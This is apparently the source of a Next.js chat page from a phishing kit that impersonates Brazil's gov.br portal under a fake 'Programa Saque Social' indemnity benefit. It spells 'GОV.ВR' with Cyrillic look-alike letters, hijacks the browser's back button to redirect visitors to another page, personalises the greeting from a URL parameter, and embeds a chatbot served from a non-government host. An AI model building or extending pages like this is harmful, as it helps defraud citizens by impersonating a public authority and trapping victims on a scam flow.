
"use client";

import React, { useState, useEffect, Suspense, useRef } from 'react';
import Head from 'next/head';
import Image from 'next/image';
import Script from 'next/script'; // Import next/script
import { useSearchParams, useRouter } from 'next/navigation';
import { MoreVertical, Cookie, LayoutGrid, User, Menu, Search } from 'lucide-react';
import '../chat-page.css';

function ChatPageContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [headerUserName, setHeaderUserName] = useState('Usuário');
  const typebotInitializedRef = useRef(false);
  const [isLocalTypebotScriptLoaded, setIsLocalTypebotScriptLoaded] = useState(false);

  useEffect(() => {
    const urlBackRedirect = '/back/index.html';
    const currentQuery = searchParams.toString();
    const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + currentQuery;

    if (window.history.state?.pageInitialized !== true) {
      history.pushState({ pageInitialized: true }, "", window.location.href);
    }
    
    const handlePopState = () => {
      setTimeout(() => {
        window.location.href = trimmedUrlBackRedirect;
      }, 1);
    };
    window.addEventListener('popstate', handlePopState);

    const nomeParam = searchParams.get('nome');
    if (nomeParam) {
      setHeaderUserName(nomeParam.split(' ')[0] || 'Usuário');
    }

    return () => {
      window.removeEventListener('popstate', handlePopState);
    };
  }, []); // Runs once on mount

  useEffect(() => {
    if (isLocalTypebotScriptLoaded) {
      if (typebotInitializedRef.current) {
        console.log('Typebot initialization already attempted/completed.');
        return;
      }

      const typebotElement = document.querySelector('typebot-standard');
      if (!typebotElement) {
        console.error('Typebot standard element not found in DOM. Initialization aborted.');
        return;
      }

      if (typebotElement.shadowRoot?.querySelector('.typebot-container')) {
        console.log('Typebot appears to be already initialized in the DOM.');
        typebotInitializedRef.current = true;
        return;
      }
      
      console.log('Local Typebot script loaded. Attempting to initialize Typebot...');
      
      if (window.Typebot && typeof window.Typebot.initStandard === 'function') {
        const typebotIdFromQuery = searchParams.get('typebotId');
        const apiHostFromQuery = searchParams.get('apiHost');

        const typebotToUse = typebotIdFromQuery || "24lkdef";
        const apiHostToUse = apiHostFromQuery || "https://chat.bestbot.info";

        console.log(`Initializing Typebot with ID: ${typebotToUse} and API Host: ${apiHostToUse}`);

        try {
          window.Typebot.initStandard({
            typebot: typebotToUse, 
            apiHost: apiHostToUse,
          });
          typebotInitializedRef.current = true; 
          console.log('Typebot.initStandard called successfully using window.Typebot.');
        } catch (e) {
          console.error('Error during Typebot.initStandard call (window.Typebot):', e);
        }
      } else {
        console.error(
          'window.Typebot or window.Typebot.initStandard is not available, even after local script reported loaded. ' +
          'This usually means the script at "/js/typebot-web.js" was loaded but did not correctly assign its Typebot object to "window.Typebot". ' +
          'Please ensure your local script (public/js/typebot-web.js) explicitly sets "window.Typebot = YourTypebotObject;" at the end of the file.'
        );
      }
    }
  }, [isLocalTypebotScriptLoaded, searchParams]);


  return (
    <>
      <Head>
        <title>Programa Saque Social - Atendimento</title>
        {/* Script tag for local Typebot will be added via next/script */}
      </Head>
      
      <Script
        src="/js/typebot-web.js" // Path to your local Typebot script
        strategy="afterInteractive" // Load after the page is interactive
        onLoad={() => {
          console.log('Local Typebot script (/js/typebot-web.js) has loaded.');
          setIsLocalTypebotScriptLoaded(true);
        }}
        onError={(e) => {
          console.error('Error loading local Typebot script (/js/typebot-web.js):', e);
        }}
      />

      <div className="chat-page-body">
        <header className="chat-page-header">
          <div className="logo">
            <svg width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
          <div className="icons">
            <button title="Opções"><MoreVertical /></button>
            <button title="Cookies"><Cookie /></button>
            <button title="Menu de Apps"><LayoutGrid /></button>
            <button className="user">
              <User />
              <span>{headerUserName}</span>
            </button>
          </div>
        </header>

        <nav className="chat-page-nav">
          <button>
            <Menu />
            <p>Benefício <span> &gt; </span> Indenização <span> &gt; </span> Atendimento</p>
          </button>
          <button title="Buscar"><Search /></button>
        </nav>

        <div className="typebot-container-wrapper">
            <div className="typebot-embed-container">
                 <typebot-standard style={{ width: '100%', height: '100%' }}></typebot-standard>
            </div>
        </div>
        
        <footer className="chat-page-footer">
          <Image 
            src="https://i.imgur.com/919uhHG.png"
            alt="Rodapé Logo" 
            width={150} 
            height={40} 
            className="footer-logo"
            data-ai-hint="company logo"
            priority={false}
          />
        </footer>
      </div>
    </>
  );
}

export default function ChatPage() {
  return (
    <Suspense fallback={
      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> 
        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> 
          <title>GОV.ВR</title> 
          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> 
            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> 
            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> 
          </text> 
        </svg> 
      </div>
    }>
      <ChatPageContent />
    </Suspense>
  );
}
